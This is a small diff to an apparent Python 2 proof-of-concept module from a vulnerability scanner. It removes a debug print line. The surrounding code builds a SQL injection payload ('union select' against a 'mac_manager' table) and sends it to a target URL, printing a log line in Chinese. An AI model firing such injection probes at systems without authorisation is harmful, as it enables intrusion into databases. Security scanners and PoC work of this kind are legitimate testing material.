@@ -31,7 +31,6 @@ class Poc(ABPoc):
         payload = 'union+select/**/+null,md5(1231412414)+from+mac_manager+--%20'
         try:
             path = vul_url+payload
-            print path
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             content = urllib2.urlopen(path).read()
